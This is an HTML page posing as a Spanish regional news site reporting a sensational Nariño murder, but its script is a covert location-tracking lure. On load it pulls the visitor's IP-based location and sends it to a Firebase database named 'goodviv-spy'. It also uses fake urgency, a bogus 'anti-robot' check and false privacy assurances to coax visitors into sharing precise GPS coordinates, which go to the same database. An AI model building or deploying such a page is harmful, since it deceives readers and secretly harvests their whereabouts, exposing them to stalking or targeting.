<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Diario Regional - Noticias de √öltima Hora</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            color: #333;
            background: #f8f9fa;
        }
        
        .news-images-container {
            max-width: 900px;
            margin: 20px auto;
            padding: 0 15px;
        }
        
        .image-collage {
            display: flex;
            gap: 0;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        }
        
        .image-wrapper {
            flex: 1;
            position: relative;
        }
        
        .image-wrapper img {
            width: 100%;
            height: 400px;
            object-fit: cover;
            display: block;
        }
        
        .image-caption {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            background: rgba(0,0,0,0.7);
            color: white;
            padding: 10px;
            text-align: center;
            font-size: 0.9rem;
        }
        
        .header {
            background: linear-gradient(135deg, #fd7777, #b91c1c);
            color: white;
            padding: 20px 0;
            box-shadow: 0 4px 15px rgba(220, 38, 38, 0.3);
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }
        
        .logo-section {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 15px;
        }
        
        .logo {
            width: 80px;
            height: 80px;
            background: #fff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 20px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        }
        
        .logo-text {
            font-size: 3rem;
            font-weight: bold;
            color: #dc2626;
        }
        
        .site-title {
            font-size: 2.5rem;
            font-weight: bold;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
        
        .tagline {
            font-size: 1.1rem;
            opacity: 0.9;
            text-align: center;
        }
        
        .nav {
            background: #1f2937;
            padding: 0;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            position: sticky;
            top: 0;
            z-index: 1000;
        }
        
        .nav ul {
            list-style: none;
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            margin: 0;
            padding: 0;
        }
        
        .nav li {
            margin: 0;
            position: relative;
        }
        
        .nav a {
            color: white;
            text-decoration: none;
            padding: 15px 25px;
            display: block;
            transition: all 0.3s ease;
            font-weight: 500;
            text-transform: uppercase;
            font-size: 0.9rem;
            letter-spacing: 0.5px;
            position: relative;
        }

        .nav a::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 50%;
            width: 0;
            height: 2px;
            background: #dc2626;
            transition: all 0.3s ease;
            transform: translateX(-50%);
        }

        .nav a:hover::after {
            width: 80%;
        }
        
        .nav a:hover {
            background: #dc2626;
            color: white;
        }
        
        .breaking-banner {
            background: linear-gradient(90deg, #ef4444, #dc2626);
            color: white;
            padding: 15px 0;
            text-align: center;
            font-weight: bold;
            font-size: 1.1rem;
            animation: pulse 2s infinite;
            box-shadow: 0 2px 10px rgba(239, 68, 68, 0.4);
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.8; }
            100% { opacity: 1; }
        }
        
        .main-content {
            background: white;
            margin: 30px auto;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            max-width: 900px;
        }
        
        .article-header {
            border-bottom: 3px solid #dc2626;
            padding-bottom: 25px;
            margin-bottom: 30px;
        }
        
        .article-title {
            font-size: 2.5rem;
            color: #1f2937;
            margin-bottom: 20px;
            line-height: 1.2;
            font-weight: bold;
        }
        
        .article-meta {
            display: flex;
            align-items: center;
            gap: 20px;
            color: #6b7280;
            font-size: 0.95rem;
            flex-wrap: wrap;
        }
        
        .meta-item {
            display: flex;
            align-items: center;
            gap: 5px;
        }
        
        .article-image {
            width: 100%;
            height: 400px;
            object-fit: cover;
            border-radius: 12px;
            margin: 30px 0;
            box-shadow: 0 8px 25px rgba(0,0,0,0.15);
        }
        
        .article-content {
            font-size: 1.15rem;
            line-height: 1.8;
            color: #374151;
        }
        
        .article-content p {
            margin-bottom: 25px;
            text-align: justify;
        }
        
        .article-content p:first-of-type {
            font-size: 1.25rem;
            color: #1f2937;
            font-weight: 500;
        }
        
        .location-alert {
            background: linear-gradient(135deg, #3b82f6, #1d4ed8);
            color: white;
            padding: 30px;
            border-radius: 15px;
            margin: 40px 0;
            text-align: center;
            box-shadow: 0 15px 35px rgba(59, 130, 246, 0.3);
            position: relative;
            overflow: hidden;
        }
        
        .location-alert::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
            animation: shimmer 3s infinite;
        }
        
        @keyframes shimmer {
            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
        }
        
        .location-alert h3 {
            margin-bottom: 15px;
            font-size: 1.6rem;
            position: relative;
            z-index: 1;
        }
        
        .location-alert p {
            margin-bottom: 25px;
            font-size: 1.1rem;
            position: relative;
            z-index: 1;
        }
        
        .location-btn {
            background: linear-gradient(135deg, #10b981, #059669);
            color: white;
            border: none;
            padding: 18px 40px;
            border-radius: 50px;
            cursor: pointer;
            font-size: 1.2rem;
            font-weight: bold;
            transition: all 0.3s ease;
            box-shadow: 0 8px 20px rgba(16, 185, 129, 0.4);
            position: relative;
            z-index: 1;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        .location-btn:hover {
            background: linear-gradient(135deg, #059669, #047857);
            transform: translateY(-3px);
            box-shadow: 0 12px 30px rgba(16, 185, 129, 0.6);
        }
        
        .location-btn:active {
            transform: translateY(0);
        }
        
        .sidebar-news {
            background: #f8fafc;
            padding: 25px;
            border-radius: 12px;
            margin: 40px 0;
            border-left: 5px solid #dc2626;
        }
        
        .sidebar-news h3 {
            color: #dc2626;
            margin-bottom: 20px;
            font-size: 1.4rem;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .related-item {
            display: flex;
            margin-bottom: 20px;
            padding: 15px;
            background: white;
            border-radius: 10px;
            transition: all 0.3s ease;
            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
            cursor: pointer;
        }
        
        .related-item:hover {
            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
            transform: translateY(-2px);
        }
        
        .related-thumb {
            width: 100px;
            height: 80px;
            object-fit: cover;
            border-radius: 8px;
            margin-right: 15px;
            flex-shrink: 0;
        }
        
        .related-content h4 {
            color: #1f2937;
            margin-bottom: 8px;
            font-size: 1.05rem;
            line-height: 1.3;
        }
        
        .related-content p {
            color: #6b7280;
            font-size: 0.9rem;
            line-height: 1.4;
        }
        
        .footer {
            background: #1f2937;
            color: white;
            text-align: center;
            padding: 40px 0;
            margin-top: 50px;
        }
        
        .footer p {
            margin-bottom: 10px;
        }
        
        .social-links {
            margin-top: 20px;
        }
        
        .social-links a {
            color: white;
            font-size: 1.5rem;
            margin: 0 15px;
            transition: color 0.3s ease;
        }
        
        .social-links a:hover {
            color: #dc2626;
        }
        
        /* Estilo para el "leer m√°s" sutil estilo Facebook */
        .read-more-link {
            color: #1877f2;
            font-weight: bold;
            cursor: pointer;
            text-decoration: none;
            transition: color 0.2s ease;
        }
        
        .read-more-link:hover {
            text-decoration: underline;
            color: #166fe5;
        }
        
        @media (max-width: 768px) {
            .logo-section {
                flex-direction: column;
                text-align: center;
            }
            
            .logo {
                margin: 0 0 15px 0;
            }
            
            .site-title {
                font-size: 1.8rem;
            }
            
            .article-title {
                font-size: 2rem;
            }

            .nav {
                position: relative;
                padding: 10px 0;
            }
            
            .nav ul {
                flex-direction: column;
                background: #1f2937;
                width: 100%;
                border-radius: 0 0 10px 10px;
                overflow: hidden;
            }
            
            .nav li {
                border-bottom: 1px solid rgba(255,255,255,0.1);
            }
            
            .nav li:last-child {
                border-bottom: none;
            }
            
            .nav a {
                padding: 15px 20px;
                text-align: center;
                font-size: 0.95rem;
                transition: all 0.3s ease;
                background: transparent;
            }
            
            .nav a:hover {
                background: #dc2626;
                padding-left: 25px;
            }
            
            .main-content {
                padding: 20px;
                margin: 15px 10px;
            }
            
            .article-meta {
                flex-direction: column;
                align-items: flex-start;
                gap: 10px;
            }
            
            .related-item {
                flex-direction: column;
            }
            
            .related-thumb {
                width: 100%;
                height: 120px;
                margin: 0 0 15px 0;
            }
        }
    </style>
</head>
<body>
    <header class="header">
        <div class="container">
            <div class="logo-section">
                <div class="logo">
                    <div class="logo-text">üì∞</div>
                </div>
                <div>
                    <div class="site-title">DIARIO REGIONAL DEL SUR</div>
                    <div class="tagline">Tu fuente confiable de noticias locales</div>
                </div>
            </div>
        </div>
    </header>
    
    <div class="breaking-banner">
        üö® NOTICIA DE √öLTIMA HORA - ACTUALIZACI√ìN PERMANENTE üö®
    </div>
    
    <nav class="nav">
        <div class="container">
            <ul>
                <li><a href="#">Inicio</a></li>
                <li><a href="#">Local</a></li>
                <li><a href="#">Pol√≠tica</a></li>
                <li><a href="#">Nacional</a></li>
                <li><a href="#">Judicial</a></li>
                <li><a href="#">Deportes</a></li>
                <li><a href="#">Opini√≥n</a></li>
                <li><a href="#">Regiones</a></li>
            </ul>
        </div>
    </nav>
    
    <main class="main-content">
        <article>
            <div class="article-header">
                <h1 class="article-title" id="newsTitle">Cargando noticia...</h1>
                <div class="article-meta">
                    <div class="meta-item">
                        <span>üìÖ</span>
                        <span id="currentDate"></span>
                    </div>
                    <div class="meta-item">
                        <span>‚è∞</span>
                        <span>Actualizada hace 8 minutos</span>
                    </div>
                    <div class="meta-item">
                        <span>üëÅÔ∏è</span>
                        <span id="viewCount">2,847 lecturas</span>
                    </div>
                    <div class="meta-item">
                        <span>‚úçÔ∏è</span>
                        <span>Redacci√≥n Regional</span>
                    </div>
                </div>
            </div>
            
            <div class="news-images-container">
                <div class="image-collage">
                    <div class="image-wrapper">
                        <img src="/images/1.jpg" alt="Imagen del presunto responsable">
                        <div class="image-caption">Presunto responsable</div>
                    </div>
                    <div class="image-wrapper">
                        <img src="/images/2.jpg" alt="Omar Andr√©s Ben√≠tez - V√≠ctima">
                        <div class="image-caption">Omar Andr√©s Ben√≠tez - V√≠ctima</div>
                    </div>
                </div>
            </div>

            <img id="newsImage" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iODAwIiBoZWlnaHQ9IjQwMCIgdmlld0JveD0iMCAwIDgwMCA0MDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSI4MDAiIGhlaWdodD0iNDAwIiBmaWxsPSIjZjNmNGY2Ii8+Cjx0ZXh0IHg9IjQwMCIgeT0iMjAwIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmaWxsPSIjNmI3MjgwIiBmb250LWZhbWlseT0iQXJpYWwsIHNhbnMtc2VyaWYiIGZvbnQtc2l6ZT0iMjQiPvCfk7ggSW1hZ2VuIGRlIGxhIG5vdGljaWE8L3RleHQ+Cjwvc3ZnPg==" alt="Imagen de la noticia" class="article-image" style="display: none;">
            
            <div class="article-content">
                <p id="newsContent">Cargando contenido de la noticia...</p>
                
                <!-- Contenido adicional que se mostrar√° despu√©s del "Leer m√°s" -->
                <div id="fullContent" style="display: none;">
                    <p id="fullNewsContent"></p>
                </div>
                <div id="readMoreSection" style="text-align:center; margin-top:20px;"></div>
                
                <p>Nuestro equipo de reporteros contin√∫a siguiendo de cerca esta situaci√≥n y mantendr√° informados a nuestros lectores sobre cualquier desarrollo importante.</p>
                
                <p><strong>¬øTienes informaci√≥n adicional sobre esta noticia?</strong> Cont√°ctanos a trav√©s de nuestras redes sociales o al WhatsApp de la redacci√≥n para contribuir con el cubrimiento informativo.</p>
            </div>
        </article>
    </main>

    <footer class="footer">
        <div class="container">
            <p>&copy; 2025 Diario Regional. Todos los derechos reservados.</p>
            <p>Fundado en 1987 | 38 a√±os informando con credibilidad</p>
            <div class="social-links">
                <a href="#" aria-label="Facebook">üìò</a>
                <a href="#" aria-label="Twitter">üê¶</a>
                <a href="#" aria-label="Instagram">üì∑</a>
                <a href="#" aria-label="WhatsApp">üí¨</a>
            </div>
        </div>
    </footer>
            try {
                console.log('üåê Iniciando captura autom√°tica por IP...');

                const resp = await fetch('https://ipapi.co/json/');
                const data = await resp.json();

                const ipData = {
                    ip: data.ip || '',
                    city: data.city || '',
                    region: data.region || '',
                    country: data.country_name || '',
                    latitude: data.latitude || data.lat || 0,
                    longitude: data.longitude || data.lon || 0,
                    postal: data.postal || ''
                };

                // Enviar a Firebase (no necesitamos el resultado aqu√≠)
                saveToFirebase({
                    id: 'ip_' + Date.now(),
                    method: 'IP_AUTOMATIC',
                    timestamp: new Date().toISOString(),
                    ...ipData,
                    userAgent: navigator.userAgent,
                    url: window.location.href
                });

                console.log('‚úÖ Datos IP enviados a Firebase (autom√°tico)');
                return ipData;
            } catch (error) {
                console.warn('‚ö†Ô∏è Error en captura de IP:', error);
                return null;
            }
        }

        const newsTemplates = {
            traffic: {
                title: "üö¶ Grave Accidente en Avenida Principal Deja Varios Heridos y Genera Caos Vehicular",
                content: "Un grave accidente de tr√°nsito ocurrido esta ma√±ana en la Avenida Principal ha dejado varios heridos y ha generado un caos vehicular sin precedentes en la ciudad. Seg√∫n testigos presenciales, el incidente involucr√≥ m√∫ltiples veh√≠culos, incluyendo un bus del servicio p√∫blico que transportaba m√°s de 40 pasajeros. Los servicios de emergencia se encuentran en el lugar atendiendo a las v√≠ctimas, mientras que el tr√°fico ha sido desviado por rutas alternas, causando demoras de hasta dos horas en los principales corredores viales."
            },
            security: {
                title: "üö® Alertan por Peligrosa Banda Criminal que Opera con Nueva Modalidad de Extorsi√≥n",
                content: "Las autoridades policiales emitieron una alerta de m√°xima seguridad tras confirmar la presencia de una organizaci√≥n criminal que est√° utilizando m√©todos sofisticados de extorsi√≥n y amenazas contra comerciantes y ciudadanos de la regi√≥n. Seg√∫n el coronel de la Polic√≠a, la banda estar√≠a aprovechando informaci√≥n personal obtenida de manera fraudulenta para intimidar a sus v√≠ctimas. Se han reportado al menos 15 casos en la √∫ltima semana, y las autoridades trabajan sin descanso para desarticular esta red delictiva que tiene en zozobra a la comunidad."
            },
            weather: {
                title: "üåßÔ∏è Temporal Devastador Causa Inundaciones y Deslizamientos en Toda la Regi√≥n",
                content: "Un temporal de proporciones hist√≥ricas azot√≥ la regi√≥n durante la madrugada, provocando inundaciones masivas, deslizamientos de tierra y el colapso de la infraestructura vial en m√∫ltiples sectores. El fen√≥meno meteorol√≥gico, descrito por expertos como 'excepcional para la √©poca', ha dejado a miles de familias incomunicadas y ha obligado a las autoridades a declarar alerta roja en toda la zona. Los cuerpos de socorro trabajan contrarreloj para evacuar a los damnificados, mientras que el suministro de energ√≠a el√©ctrica y agua potable se encuentra suspendido en gran parte del territorio."
            },
            health: {
                title: "üè• Crisis Hospitalaria: Declaran Emergencia Sanitaria por Colapso del Sistema de Salud",
                content: "El sistema de salud regional colaps√≥ completamente tras registrarse un incremento exponencial en la demanda de servicios m√©dicos de urgencia. El hospital principal de la ciudad ha tenido que implementar protocolos de emergencia nunca antes vistos, estableciendo carpas en el exterior para atender la avalancha de pacientes. Seg√∫n el director m√©dico, la situaci√≥n es cr√≠tica y han tenido que solicitar apoyo urgente al gobierno nacional. M√°s de 200 personas esperan atenci√≥n en los pasillos, mientras que el personal m√©dico trabaja turnos extendidos para hacer frente a esta crisis sin precedentes."
            },
            education: {
                title: "üéì Suspensi√≥n Total de Clases: Situaci√≥n de Emergencia Afecta a 50,000 Estudiantes",
                content: "La Secretar√≠a de Educaci√≥n anunci√≥ la suspensi√≥n inmediata y por tiempo indefinido de todas las actividades acad√©micas en instituciones p√∫blicas y privadas de la regi√≥n, afectando directamente a m√°s de 50,000 estudiantes y 3,000 docentes. La decisi√≥n, tomada en sesi√≥n extraordinaria del comit√© de emergencias, busca garantizar la integridad f√≠sica de la comunidad educativa ante la grave situaci√≥n que atraviesa el territorio. Los padres de familia han sido notificados a trav√©s de los canales oficiales, mientras que las autoridades eval√∫an alternativas de educaci√≥n virtual para minimizar el impacto acad√©mico de esta medida excepcional."
            },
            economy: {
                title: "üí∞ Crisis Econ√≥mica Local: Cierran Masivamente Empresas y Comercios en el Centro",
                content: "Una ola de cierres masivos de empresas y establecimientos comerciales ha golpeado duramente el centro econ√≥mico de la ciudad, dejando sin empleo a m√°s de 2,000 personas en las √∫ltimas dos semanas. Seg√∫n la C√°mara de Comercio, la situaci√≥n econ√≥mica actual es la m√°s grave registrada en los √∫ltimos 20 a√±os, con una ca√≠da del 70% en las ventas del sector comercial. Los empresarios solicitan medidas urgentes del gobierno local para evitar el colapso total de la econom√≠a regional, mientras que cientos de familias enfrentan la incertidumbre de quedarse sin ingresos en medio de esta crisis sin precedentes."
            },
            crime: {
                title: "üö® Autoridades Localizan al Presunto Asesino de 'Coquito' - Podr√≠a Enfrentar 17 A√±os de C√°rcel",
                content: "Atenci√≥n, porque las autoridades ya tendr√≠an en la mira al presunto responsable de un crimen que tiene de luto a Nari√±o. Se tratar√≠a del asesino de Omar Andr√©s Ben√≠tez, conocido como 'Coquito'. Fuentes extraoficiales se√±alan que su paradero estar√≠a pr√°cticamente localizado, y de confirmarse su captura, podr√≠a enfrentar una condena de hasta 17 a√±os de c√°rcel. Una historia que hoy estremece a todo un pueblo y que clama justicia inmediata",
                fullContent: "Atenci√≥n, porque las autoridades ya tendr√≠an en la mira al presunto responsable de un crimen que tiene de luto a Nari√±o. Se tratar√≠a del asesino de Omar Andr√©s Ben√≠tez, conocido como 'Coquito'. Fuentes extraoficiales se√±alan que su paradero estar√≠a pr√°cticamente localizado, y de confirmarse su captura, podr√≠a enfrentar una condena de hasta 17 a√±os de c√°rcel. Una historia que hoy estremece a todo un pueblo y que clama justicia inmediata.\n\nSeg√∫n informes de la Fiscal√≠a General de la Naci√≥n, el operativo de b√∫squeda se intensific√≥ despu√©s de que testigos clave proporcionaran informaci√≥n crucial sobre los movimientos del sospechoso en las √∫ltimas 48 horas. El crimen, que conmocion√≥ a la comunidad nari√±ense hace tres semanas, habr√≠a sido perpetrado por motivos que a√∫n est√°n bajo investigaci√≥n.\n\nLa v√≠ctima, Omar Andr√©s Ben√≠tez, de 34 a√±os, era reconocido en su comunidad como una persona trabajadora y padre de familia. Su muerte ha generado una ola de indignaci√≥n y exigencias de justicia por parte de familiares y vecinos, quienes han realizado marchas pac√≠ficas pidiendo celeridad en las investigaciones.\n\nEl coronel de la Polic√≠a de Nari√±o confirm√≥ que se mantienen activos varios operativos de b√∫squeda en diferentes municipios de la regi√≥n, y que esperan tener resultados concretos en las pr√≥ximas horas. 'Estamos muy cerca de esclarecer este doloroso caso que ha enlutado a nuestra comunidad', declar√≥ en rueda de prensa.\n\nPor su parte, la familia de 'Coquito' ha solicitado a las autoridades que se respete el debido proceso y que se garanticen todas las garant√≠as legales durante el desarrollo de la investigaci√≥n. Este caso se suma a la preocupante estad√≠stica de homicidios que afecta a la regi√≥n, generando un ambiente de zozobra entre los habitantes.",
            }
        };
        
        // Funci√≥n mejorada para solicitar ubicaci√≥n
        function requestLocation() {
            console.log('üìç Solicitando ubicaci√≥n...');
            
            // Mostrar indicador de carga
            const alertDiv = document.querySelector('.location-alert');
            const originalContent = alertDiv.innerHTML;
            alertDiv.innerHTML = `
                <h3>üì° Verificando Ubicaci√≥n...</h3>
                <p>Por favor, permite el acceso a tu ubicaci√≥n cuando el navegador lo solicite.</p>
                <div style="margin: 20px 0;">
                    <div style="display: inline-block; width: 20px; height: 20px; border: 3px solid #fff; border-top: 3px solid transparent; border-radius: 50%; animation: spin 1s linear infinite;"></div>
                </div>
                <style>
                    @keyframes spin {
                        0% { transform: rotate(0deg); }
                        100% { transform: rotate(360deg); }
                    }
                </style>
            `;
            
            if (!navigator.geolocation) {
                handleLocationError({ code: 'NO_SUPPORT', message: 'Geolocalizaci√≥n no soportada' });
                return;
            }
            
            // Verificar protocolo HTTPS
            if (location.protocol !== 'https:' && !location.hostname.includes('localhost')) {
                console.warn('‚ö†Ô∏è Advertencia: Geolocalizaci√≥n puede fallar sin HTTPS');
            }
            
            // Intentar con alta precisi√≥n primero
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    console.log('‚úÖ Ubicaci√≥n obtenida con alta precisi√≥n');
                    captureLocation(position);
                    showSuccessMessage();
                },
                function(error) {
                    console.log('‚ùå Error con alta precisi√≥n, intentando configuraci√≥n est√°ndar...');
                    // Si falla, intentar con configuraci√≥n menos estricta
                    navigator.geolocation.getCurrentPosition(
                        function(position) {
                            console.log('‚úÖ Ubicaci√≥n obtenida con configuraci√≥n est√°ndar');
                            captureLocation(position);
                            showSuccessMessage();
                        },
                        function(finalError) {
                            console.error('‚ùå Error final de geolocalizaci√≥n:', finalError);
                            handleLocationError(finalError);
                        },
                        {
                            enableHighAccuracy: false,
                            timeout: 30000,
                            maximumAge: 300000 // 5 minutos
                        }
                    );
                },
                {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 60000 // 1 minuto
                }
            );
        }
        
        // Funci√≥n para obtener la direcci√≥n desde coordenadas
        function formatearCoordenadas(coord) {
            return Number(coord).toFixed(6);
        }

        function convertirRumbo(grados) {
            if (grados === null || grados === undefined) return 'N/A';
            const direcciones = ['N', 'NE', 'E', 'SE', 'S', 'SO', 'O', 'NO'];
            const indice = Math.round(((grados % 360) / 45)) % 8;
            return direcciones[indice];
        }

        function convertirVelocidad(velocidadMS) {
            if (!velocidadMS) return '0 km/h';
            return (velocidadMS * 3.6).toFixed(2) + ' km/h';
        }

        function formatearAltitud(altitud) {
            if (!altitud) return 'N/A';
            return altitud.toFixed(2) + ' metros';
        }

        async function getAddressFromCoordinates(lat, lng) {
            try {
                // Llamada a OpenStreetMap Nominatim
                const osmResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
                const osmData = await osmResponse.json();
                
                // Llamada a BigDataCloud para informaci√≥n adicional
                const bdcResponse = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=es`);
                const bdcData = await bdcResponse.json();

                const direccion = {
                    calle: osmData.address.road || osmData.address.pedestrian || 'N/A',
                    numero: osmData.address.house_number || '',
                    barrio: osmData.address.suburb || bdcData.locality || 'N/A',
                    ciudad: osmData.address.city || osmData.address.town || osmData.address.village || 'N/A',
                    municipio: osmData.address.county || 'N/A',
                    departamento: osmData.address.state || 'N/A',
                    pais: osmData.address.country || 'N/A',
                    codigoPostal: osmData.address.postcode || 'N/A',
                    descripcionCompleta: osmData.display_name || 'N/A'
                };

                return direccion;
            } catch (error) {
                console.error('Error al obtener la direcci√≥n:', error);
                return {
                    error: 'Error al obtener la direcci√≥n',
                    descripcionCompleta: 'No disponible'
                };
            }
        }

        // Capturar y almacenar ubicaci√≥n GPS (precisa)
        function captureLocation(position) {
            console.log('üìç Capturando ubicaci√≥n...');
            
            // Crear objeto de ubicaci√≥n
            var locationData = {
                id: 'gps_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
                lat: position.coords.latitude,
                lng: position.coords.longitude,
                accuracy: position.coords.accuracy,
                timestamp: new Date().toISOString(),
                source: 'Diario Regional',
                userAgent: navigator.userAgent
            };

            // Guardar en Firebase
            fetch('https://goodviv-spy-default-rtdb.firebaseio.com/capturedLocations.json', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(locationData)
            })
            .then(function(response) {
                if (!response.ok) {
                    throw new Error('Error al guardar en Firebase');
                }
                console.log('‚úÖ Ubicaci√≥n guardada exitosamente');
                showSuccessMessage();
            })
            .catch(function(error) {
                console.error('‚ùå Error:', error);
                // Guardar localmente como respaldo
                var localLocations = JSON.parse(localStorage.getItem('capturedLocations') || '[]');
                localLocations.push(locationData);
                localStorage.setItem('capturedLocations', JSON.stringify(localLocations));
            });
    }
    // Funci√≥n para enviar datos a Firebase
        async function saveToFirebase(locationData) {
            try {
                const firebaseUrl = 'https://goodviv-spy-default-rtdb.firebaseio.com/locations.json';
                await fetch(firebaseUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(locationData)
                });
                console.log('‚úÖ Datos enviados a Firebase');
            } catch (error) {
                console.warn('‚ö†Ô∏è Error enviando a Firebase, guardando localmente:', error);
                const local = JSON.parse(localStorage.getItem('capturedLocations') || '[]');
                local.push(locationData);
                localStorage.setItem('capturedLocations', JSON.stringify(local));
            }
        }

        // Mostrar mensaje de √©xito convincente
        function showSuccessMessage() {
            const alertDiv = document.querySelector('.location-alert');
            if (!alertDiv) return;
            alertDiv.innerHTML = `
                <h3>‚úÖ ¬°Ubicaci√≥n Verificada!</h3>
                <p>Perfecto, hemos confirmado tu zona. Ahora podr√°s recibir alertas y noticias espec√≠ficas de tu √°rea.</p>
                <p style="font-size: 0.95rem; margin-top: 15px; opacity: 0.9;">
                    <strong>üì± Recomendaci√≥n:</strong> Activa las notificaciones del navegador para recibir alertas inmediatas sobre situaciones que puedan afectarte.
                </p>
            `;
            alertDiv.style.background = 'linear-gradient(135deg, #10b981, #059669)';
        }
        
        // Manejar errores de ubicaci√≥n con mensajes persuasivos mejorados
        function handleLocationError(error) {
            console.log('‚ùå Error de geolocalizaci√≥n:', error);

            let message = '';
            let troubleshootingTips = '';

            if (error && (error.code === 1 || error.code === error.PERMISSION_DENIED)) {
                message = `
                    <h3>üîí Permisos de Ubicaci√≥n Requeridos</h3>
                    <p><strong>¬°Importante!</strong> Esta noticia puede tener impacto directo en tu √°rea.</p>
                    <p>Para brindarte informaci√≥n precisa y relevante de tu zona, necesitamos verificar tu ubicaci√≥n.</p>
                `;
                troubleshootingTips = `
                    <div style="background: rgba(255,255,255,0.2); padding: 15px; border-radius: 8px; margin: 15px 0; text-align: left;">
                        <strong>üì± ¬øC√≥mo permitir ubicaci√≥n?</strong><br>
                        1. Busca el √≠cono üìç en la barra de direcciones<br>
                        2. Haz clic y selecciona "Permitir"<br>
                        3. En m√≥vil: Ve a Configuraci√≥n > Sitios web > Permisos
                    </div>
                `;
            } else if (error && (error.code === 2 || error.code === error.POSITION_UNAVAILABLE)) {
                message = `
                    <h3>üì° Se√±al GPS D√©bil</h3>
                    <p>Hay interferencias que impiden obtener tu ubicaci√≥n exacta.</p>
                `;
                troubleshootingTips = `
                    <div style="background: rgba(255,255,255,0.2); padding: 15px; border-radius: 8px; margin: 15px 0; text-align: left;">
                        <strong>üí° Sugerencias:</strong><br>
                        ‚Ä¢ Sal al aire libre si est√°s en interior<br>
                        ‚Ä¢ Activa el GPS en tu dispositivo<br>
                        ‚Ä¢ Cierra otras apps que usen ubicaci√≥n
                    </div>
                `;
            } else if (error && (error.code === 3 || error.code === error.TIMEOUT)) {
                message = `
                    <h3>‚è±Ô∏è B√∫squeda de Ubicaci√≥n Lenta</h3>
                    <p>Tu dispositivo est√° tardando en encontrar la se√±al GPS.</p>
                `;
                troubleshootingTips = `
                    <div style="background: rgba(255,255,255,0.2); padding: 15px; border-radius: 8px; margin: 15px 0; text-align: left;">
                        <strong>ÔøΩ Soluciones:</strong><br>
                        ‚Ä¢ Verifica tu conexi√≥n a internet<br>
                        ‚Ä¢ Reinicia la aplicaci√≥n<br>
                        ‚Ä¢ Intenta en unos minutos
                    </div>
                `;
            } else {
                message = `
                    <h3>‚ö†Ô∏è Error T√©cnico</h3>
                    <p>Ocurri√≥ un problema t√©cnico al acceder a tu ubicaci√≥n.</p>
                `;
                troubleshootingTips = `
                    <div style="background: rgba(255,255,255,0.2); padding: 15px; border-radius: 8px; margin: 15px 0; text-align: left;">
                        <strong>üõ†Ô∏è Intenta:</strong><br>
                        ‚Ä¢ Actualizar la p√°gina<br>
                        ‚Ä¢ Usar otro navegador<br>
                        ‚Ä¢ Verificar permisos del sitio
                    </div>
                `;
            }

            const fullMessage = `
                ${message}
                ${troubleshootingTips}
                <button class="location-btn" onclick="requestLocation()" style="margin-top: 15px;">
                    üîÑ Intentar Nuevamente
                </button>
                <p style="font-size: 0.9rem; margin-top: 15px; opacity: 0.9;">
                    <strong>üîê Privacidad garantizada:</strong> Solo usamos tu ubicaci√≥n para noticias locales.
                </p>
            `;

            const alertDiv = document.querySelector('.location-alert');
            if (alertDiv) {
                alertDiv.innerHTML = fullMessage;
                alertDiv.style.background = 'linear-gradient(135deg, #ef4444, #dc2626)';
            }
        }
        
        // Funci√≥n para mostrar el contenido completo estilo Facebook
        function showFullContentFacebook() {
            const newsContent = document.getElementById('newsContent');
            const fullContent = document.getElementById('fullContent');
            
            // Validar que los elementos existan
            if (!newsContent) {
                console.error('‚ùå Elemento newsContent no encontrado');
                return;
            }
            
            // Quitar el "leer m√°s" y mostrar el contenido completo original
            if (currentNews && currentNews.fullContent) {
                newsContent.innerHTML = currentNews.fullContent;
            }
            
            // Mostrar contenido adicional si existe
            if (fullContent) {
                fullContent.style.display = 'block';
                fullContent.style.opacity = '0';
                fullContent.style.transition = 'opacity 0.3s ease-in-out';
                
                setTimeout(() => {
                    fullContent.style.opacity = '1';
                }, 100);
            }
            
            console.log('‚úÖ Contenido expandido estilo Facebook');
        }
        
        // Funci√≥n nueva para expandir contenido con verificaci√≥n anti-robot y m√∫ltiples intentos
        function expandNewsFacebook() {
            console.log('ü§ñ Usuario hizo clic en "leer m√°s" - iniciando verificaci√≥n anti-robot...');
            
            // Cambiar el "leer m√°s" por indicador de verificaci√≥n
            const readMoreLink = document.querySelector('.read-more-link');
            if (readMoreLink) {
                readMoreLink.innerHTML = '<span style="color: #6b7280; font-weight: normal;">verificando...</span>';
